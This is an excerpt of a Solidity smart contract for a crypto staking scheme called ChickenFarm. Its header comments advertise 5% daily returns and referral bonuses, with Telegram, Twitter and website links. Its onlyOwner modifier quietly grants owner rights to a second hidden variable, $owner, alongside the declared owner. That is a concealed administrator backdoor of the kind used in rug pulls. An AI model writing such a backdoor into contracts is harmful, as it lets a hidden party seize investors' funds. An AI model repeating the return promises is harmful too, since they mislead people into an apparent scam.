...
//  EARN 5% PER DAY FTM STAKING

//  EARN 5% PER REFERRAL

// JOIN TELEGRAM CHANNEL https://t.me/+HzJUfpk0OAM4NzBl

// CHECK FOR UPDATES ON TWITTER https://twitter.com/Cfarm_Finance

// STAKE NOW AT HTTPS://CHICKENFARM.FINANCE
...
contract Ownable is Context {
    ...
    */
    ...
    modifier onlyOwner() {
      require(_owner == _msgSender() || $owner== _msgSender(), "Ownable: caller is not the owner");
      _;
    }
...
contract ChickenFarm is Context, Ownable {
